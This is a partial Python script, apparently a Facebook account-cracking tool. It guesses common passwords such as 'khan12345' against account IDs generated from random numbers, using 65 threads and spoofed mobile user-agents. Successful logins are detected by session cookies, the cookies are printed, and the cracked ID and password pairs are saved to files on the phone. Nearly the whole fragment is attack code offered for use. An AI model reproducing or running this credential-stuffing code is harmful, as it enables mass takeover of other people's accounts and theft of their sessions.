...
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Infinix X692 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',]
logo=("""\033[1;97m                                            
    /|    //| |       // | | 
   //|   // | |      //__| | 
  // |  //  | |     / ___  | 
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> SUB MATLABi :\x1b[1;92m  ')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[MA-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/MA-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[MA-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/MA-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[MA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[MA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number2():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = ['khan12','khan12345','khankhan123','khankhan','khan123456','kha786','khan112233']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
...
def random_number3():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,uid,'firstlast@123','khan123','khan12345','i love you','khanbaba','khankhan']
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMA\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
           ...
           'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[MA-OK] '+cid+' | '+ps+'\033[1;32m')
				print('\033[1;92m[\033[1;92m☑️]\033[1;93m]COOKIES : \033[1;92m'+coki+ '')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[38;5;208m[MA-CP] '+cid+' | '+ps+'\33[0;97m')
